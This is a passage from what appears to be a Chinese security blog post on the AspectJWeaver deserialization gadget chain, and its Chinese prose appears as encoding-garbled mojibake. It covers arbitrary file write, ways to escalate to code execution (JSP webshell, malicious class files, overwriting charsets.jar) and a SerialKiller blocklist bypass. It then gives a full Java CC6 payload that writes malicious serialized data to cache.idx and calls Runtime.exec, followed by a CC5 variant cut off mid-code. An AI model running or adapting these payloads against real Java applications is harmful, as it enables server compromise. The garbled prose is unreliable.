SAME_BYTES_STRING.getBytes();<br></code></pre></td></tr></table></figure><p>ä¸€é€šåˆ†ææ˜¾ç„¶ä¼šè¿›åˆ°elseï¼Œè·Ÿè¿›<code>writeToPath</code>ï¼Œè¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯å°†å­—èŠ‚æ•°ç»„å†™å…¥åˆ°æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ä¸­ã€‚å®ƒåˆ›å»ºä¸€ä¸ªæ–‡ä»¶è¾“å‡ºæµå¯¹è±¡ï¼Œå°†å­—èŠ‚æ•°ç»„<strong>å†™å…¥åˆ°æ–‡ä»¶</strong>ä¸­ï¼Œç„¶ååˆ·æ–°è¾“å‡ºæµå¹¶å…³é—­å®ƒã€‚æœ€åï¼Œè¿”å›å†™å…¥çš„æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ã€‚ </p><p>åœ¨return fullPathå¤„è®¾æ–­ï¼Œæ³¨æ„åˆ°å†™å…¥ä»¥åŠå–åˆ°çš„æ–‡ä»¶è·¯å¾„å°±æ˜¯ç”±this.folderï¼ŒFile.separatorå’Œkeyæ‹¼æ¥è€Œæˆçš„ï¼š</p><p><img src="/2024/08/09/AspectJWeaver/image-20240809194209784.png" alt="image-20240809194209784"></p><p><code>writeToPath</code>å®ç°å†™æ–‡ä»¶ï¼Œfolderå’Œkeyæ‹¼æ¥ç»„æˆæ–‡ä»¶å…¨è·¯å¾„ã€‚ä¼ å…¥<code>StoreableCachingMap#put</code>çš„keyä¸ºæ–‡ä»¶åï¼Œvalueä¸ºå†™å…¥çš„å†…å®¹ã€‚</p><p>åªè¦ä»¤ä¼ å…¥çš„mapä¸ºStoreableCachingMapå³å¯è§¦å‘StoreableCachingMap#put</p><p>è€Œvalueçš„å€¼ä¹Ÿæ˜¯æˆ‘ä»¬é€šè¿‡ConstantTransformerå¯æ§çš„ï¼Œå¦‚æœkeyä¹Ÿå¯æ§ï¼Œé‚£ä¹ˆæ–‡ä»¶å†…å®¹å’Œè·¯å¾„éƒ½å°†ç”±æˆ‘ä»¬ä¸ºæ‰€æ¬²ä¸ºã€‚</p><p>ä½†å•çº¯çš„å†™æ–‡ä»¶å±å®³ä¸å¤§ï¼Œè¿˜å¾—é…åˆå…¶ä»–æ¼æ´æ‰“ã€‚é¢˜ç›®ä¸­é‡åˆ°ä¹Ÿåªä¼šæˆä¸ºä¸€ä¸ªå°trickã€‚</p><p>å¦‚ä½•å°†å†™æ–‡ä»¶å‡çº§ä¸ºRCEå‘¢</p><h3 id="Jsp-WebShell"><a href="#Jsp-WebShell" class="headerlink" title="Jsp WebShell"></a>Jsp WebShell</h3><p>è‹¥ç›®æ ‡åº”ç”¨æ”¯æŒè§£æJSPï¼Œå¯ä»¥ç›´æ¥å†™ä¸ªJsp WebShellã€‚</p><h3 id="class-file-in-WEB-INF-classes"><a href="#class-file-in-WEB-INF-classes" class="headerlink" title="class file in WEB-INF&#x2F;classes"></a>class file in WEB-INF&#x2F;classes</h3><p>æ—¢ç„¶æœ‰ååºåˆ—åŒ–å…¥å£ï¼Œåœ¨<code>WEB-INF/classes</code>ä¸‹å†™å…¥ä¸€ä¸ªæ¶æ„çš„å­—èŠ‚ç æ–‡ä»¶ï¼Œåœ¨<code>readObject</code>æˆ–é™æ€ä»£ç å—ä¸­ç¼–å†™å‘½ä»¤æ‰§è¡Œï¼Œç„¶åå†ååºåˆ—åŒ–è¿™ä¸ªç±»ã€‚è‹¥æœ‰å¾€<code>JAVA_HOME</code>å†™çš„æƒé™ï¼Œå¯ä»¥å¾€<code>jre/classes</code>å†™å…¥ç¼–è¯‘å¥½çš„classã€‚</p><h3 id="FatJar-under-SpringBoot"><a href="#FatJar-under-SpringBoot" class="headerlink" title="FatJar under SpringBoot"></a>FatJar under SpringBoot</h3><p>ç°å¾ˆå¤šåº”ç”¨éƒ½é‡‡ç”¨äº†SpringBootæ‰“åŒ…æˆä¸€ä¸ªjaræˆ–è€…waråŒ…æ”¾åˆ°æœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼Œæˆ‘ä»¬æ— æ³•å¾€classpathå†™jspæˆ–å­—èŠ‚ç æ–‡ä»¶äº†ï¼Œé‚£å°±è€ƒè™‘è¦†ç›–jdkçš„ç³»ç»Ÿç±»ã€‚</p><p>ç”±äºjvmçš„ç±»åŠ è½½æœºåˆ¶ï¼Œå¹¶ä¸ä¼šä¸€æ¬¡æ€§æŠŠæ‰€æœ‰jdkä¸­çš„jaråŒ…éƒ½è¿›è¡ŒåŠ è½½ã€‚</p><p>å¾€ç›®æ ‡ç¯å¢ƒå†™å…¥&#x2F;jre&#x2F;lib&#x2F;charsets.jarè¿›è¡Œè¦†ç›–ï¼Œç„¶ååœ¨request headerä¸­åŠ å…¥ç‰¹æ®Šå¤´éƒ¨ï¼Œæ­¤æ—¶ç”±äºç»™å®šäº†å­—ç¬¦ç¼–ç ï¼Œä¼šè®©jvmå»åŠ è½½charset.jarï¼Œä»è€Œè§¦å‘æ¶æ„ä»£ç ã€‚</p><p>è¿™ç§æ–¹æ³•çš„ç¼ºç‚¹æ˜¯ç›®æ ‡$JAVA_HOMEæœªçŸ¥ï¼Œéœ€ä¸€ä¸ªä¸ªå°è¯•ã€‚</p><p>å¯ä»¥å‚è€ƒ<a href="https://landgrey.me/blog/22/">LandGreyâ€™s Blog</a></p><h2 id="Bypass-SerialKiller"><a href="#Bypass-SerialKiller" class="headerlink" title="Bypass SerialKiller"></a>Bypass SerialKiller</h2><p>åˆ©ç”¨é“¾ä¸­çš„<code>ConstantTransformer</code>åœ¨<code>SerialKiller</code>ä¸­è¢«banäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://github.com/ikkisoft/SerialKiller<br></code></pre></td></tr></table></figure><p>éœ€è¦æ‰¾ä¸€ä¸ªå’Œ<code>ConstantTransformer</code>æ•ˆæœç­‰åŒçš„<code>Transformer</code></p><ul><li>ï¼ˆXï¼‰<code>StringValueTransformer</code></li></ul><p><code>transform</code>è¿”å›è¾“å…¥å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œä¼šè°ƒç”¨<code>toString()</code></p><p><img src="/2024/08/09/AspectJWeaver/image-20240809193140265.png" alt="image-20240809193140265"></p><p>ä½†åé¢å†™æ–‡ä»¶æ—¶ä¼šæŠŠvalueå¼ºè½¬ä¸º<code>byte[]</code>ï¼Œè€Œ<code>String</code>å¼ºè½¬ä¸äº†<code>byte[]</code>ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥æˆåŠŸã€‚</p><ul><li>ï¼ˆâˆšï¼‰<code>FactoryTransformer</code>+<code>ConstantFactory</code></li></ul><p><img src="/2024/08/09/AspectJWeaver/image-20240809193242920.png" alt="image-20240809193242920"></p><p><img src="/2024/08/09/AspectJWeaver/image-20240809193258234.png" alt="image-20240809193258234"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> FactoryTransformer.getInstance(ConstantFactory.getInstance(<span class="hljs-string">&quot;666&quot;</span>.getBytes(StandardCharsets.UTF_8)));<br></code></pre></td></tr></table></figure><h2 id="Forward-Deser"><a href="#Forward-Deser" class="headerlink" title="Forward Deser"></a>Forward Deser</h2><p>åˆ©ç”¨<code>AspectJWeaver</code>ä»»æ„æ–‡ä»¶å†™åï¼Œå‘ç°åŒç›®å½•ä¸‹å‡ºç°äº†ä¸€ä¸ª<code>cache.idx</code>æ–‡ä»¶</p><p><code>StorableCachingMap#put</code>ä¸­è°ƒç”¨å®Œ<code>writeToPath</code>åç´§æ¥ç€è°ƒç”¨äº†<code>storeMap</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">storeMap</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>    <span class="hljs-keyword">if</span> ((now - lastStored ) &lt; storingTimer)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(folder + File.separator + CACHENAMEIDX);;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file));<br>        <span class="hljs-comment">// Deserialize the object</span><br>        out.writeObject(<span class="hljs-built_in">this</span>);<br>        out.close();<br>        lastStored = now;<br>    &#125; <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è·å–å½“å‰ç³»ç»Ÿæ—¶é—´ï¼Œè‹¥å’Œä¸Šæ¬¡å­˜å‚¨æ—¶é—´çš„æ—¶é—´å·®å¤§äº<code>storingTimer</code>ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶<code>cache.idx</code>ï¼Œå¹¶å°†<code>this</code>åºåˆ—åŒ–å†™å…¥ã€‚</p><p>æœ‰åºåˆ—åŒ–çš„åœ°æ–¹å¿…ç„¶æœ‰ååºåˆ—åŒ–ï¼Œ<code>StorableCachingMap#init</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> StoreableCachingMap <span class="hljs-title function_">init</span><span class="hljs-params">(String folder)</span> &#123;<br>    <span class="hljs-keyword">return</span> init(folder,DEF_STORING_TIMER);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> StoreableCachingMap <span class="hljs-title function_">init</span><span class="hljs-params">(String folder, <span class="hljs-type">int</span> storingTimer)</span> &#123;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(folder + File.separator + CACHENAMEIDX);<br>    <span class="hljs-keyword">if</span> (file.exists()) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file));<br>            <span class="hljs-comment">// Deserialize the object</span><br>            <span class="hljs-type">StoreableCachingMap</span> <span class="hljs-variable">sm</span> <span class="hljs-operator">=</span> (StoreableCachingMap) in.readObject();<br>            sm.initTrace();<br>            in.close();<br>            <span class="hljs-keyword">return</span> sm;<br>        &#125; <span class="hljs-comment">// ...</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StoreableCachingMap</span>(folder,storingTimer);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯»å–äº†<code>cache.idx</code>å¹¶è¿›è¡Œååºåˆ—åŒ–ã€‚æ¥ç€çœ‹å“ªé‡Œè°ƒç”¨äº†<code>StoreableCachingMap#init</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-title function_">SimpleCache</span><span class="hljs-params">(String folder, <span class="hljs-type">boolean</span> enabled)</span> &#123;<br>    <span class="hljs-built_in">this</span>.enabled = enabled;<br><br>    cacheMap = Collections.synchronizedMap(StoreableCachingMap.init(folder));<br><br>    <span class="hljs-keyword">if</span> (enabled) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">generatedCachePath</span> <span class="hljs-operator">=</span> folder + File.separator + GENERATED_CACHE_SUBFOLDER;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span> (generatedCachePath);<br>        <span class="hljs-keyword">if</span> (!f.exists())&#123;<br>            f.mkdir();<br>        &#125;<br>        generatedCache = Collections.synchronizedMap(StoreableCachingMap.init(generatedCachePath,<span class="hljs-number">0</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨<code>SimpleCache</code>çš„æ„é€ æ–¹æ³•ä¸­è°ƒç”¨<code>StoreableCachingMap#init</code>ä¹Ÿå¾ˆå¥½ç†è§£ã€‚</p><p>é¡¾åæ€ä¹‰è¿™ä¸ªç±»æ˜¯ä¸€ä¸ªç¼“å­˜ç±»ï¼Œ<code>cacheMap</code>æˆå‘˜å³å…¶å†…éƒ¨ç±»<code>StoreableCachingMap</code>ï¼Œå……å½“äº†ä¸€ä¸ªå†…å­˜å±‚é¢çš„é”®å€¼å¯¹ç¼“å­˜ï¼Œå½“ç„¶å®ƒæ”¯æŒæŒä¹…åŒ–å­˜å‚¨ï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡å†™å…¥ç¼“å­˜ï¼ˆ<code>StoreableCachingMap#put</code>ï¼‰æ—¶ï¼Œåˆ¤æ–­å’Œä¸Šæ¬¡å­˜å‚¨æ—¶é—´çš„æ—¶é—´å·®æ˜¯å¦è¶…è¿‡<code>storingTimer</code>å­˜å‚¨è®¡æ—¶å™¨ï¼Œè¶…è¿‡åˆ™è¿›è¡ŒæŒä¹…åŒ–æ“ä½œï¼Œå­˜å‚¨æ ¼å¼æ˜¯åºåˆ—åŒ–æ•°æ®ï¼Œå­˜å‚¨æ–‡ä»¶ä¸º<code>cache.idx</code>ã€‚</p><p>ä¸‹æ¬¡éœ€è¦æ¢å¤åˆ°å†…å­˜çš„æ—¶å€™ï¼Œåªéœ€é‡æ–°æ„é€ ä¸€ä¸ª<code>SimpleCache</code>å¯¹è±¡å³å¯ï¼Œå®ƒä¼šè°ƒç”¨<code>StoreableCachingMap#init</code>å¯¹æŒä¹…åŒ–æ–‡ä»¶è¿›è¡Œååºåˆ—åŒ–ï¼Œå¾—åˆ°åŸæ¥çš„<code>cacheMap</code>ã€‚</p><p>æ€è·¯åˆ°è¿™é‡Œå°±å¾ˆæ˜æ˜¾äº†ï¼Œå…ˆç”¨<code>AspectJWeaver</code>å¾€<code>cache.idx</code>å†™å…¥æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œå†é€šè¿‡CCé“¾è§¦å‘æ„é€ å‡½æ•°ã€‚</p><p>ä¸ºäº†é˜²æ­¢å†™å…¥æ–‡ä»¶åï¼Œ<code>storeMap</code>åˆé©¬ä¸Šé‡å†™äº†æˆ‘ä»¬çš„<code>cache.idx</code>ï¼Œè®¾ç½®<code>storingTimer</code>ä¸ºç¨å¾®å¤§ä¸€ç‚¹çš„å€¼ã€‚</p><p>å¾ˆå¯æƒœï¼Œä¸ç®¡æ˜¯<code>InstantiateTransformer</code>è¿˜æ˜¯<code>InstantiateFactory</code>ï¼Œéƒ½è¦æ±‚ç›®æ ‡ç±»çš„æ„é€ æ–¹æ³•éœ€è¦æ˜¯<code>public</code></p><p>åº”è¯¥èƒ½é…åˆå…¶ä»–æ¼æ´æ‰“ï¼Œæ¯”å¦‚<code>SnakeYaml</code></p><p>è´´ä¸€ä¸ªå†™CC6åºåˆ—åŒ–æ•°æ®çš„payloadï¼Œæ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨<code>SimpleCache</code>æ„é€ å™¨çš„é—®é¢˜äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:/&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cache.idx&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        writeFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeFile</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);<br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> (Map) constructor.newInstance(path, <span class="hljs-number">6000000</span>);<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> FactoryTransformer.getInstance(ConstantFactory.getInstance(CC6()));<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, fileName);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        setValue(val, <span class="hljs-string">&quot;val&quot;</span>, entry);<br>        ser(val);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        objectOutputStream.writeObject(o);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] CC6() <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;b&quot;</span>);<br><br>        setValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="CC5æ”¹é“¾"><a href="#CC5æ”¹é“¾" class="headerlink" title="CC5æ”¹é“¾"></a>CC5æ”¹é“¾</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AJCC5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// åå°„è·å–æ„é€ å‡½æ•°</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>).getDeclaredConstructor(String.class,<span class="hljs-type">int</span>.class);<br>        con.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// å®ä¾‹åŒ–å¯¹è±¡</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span 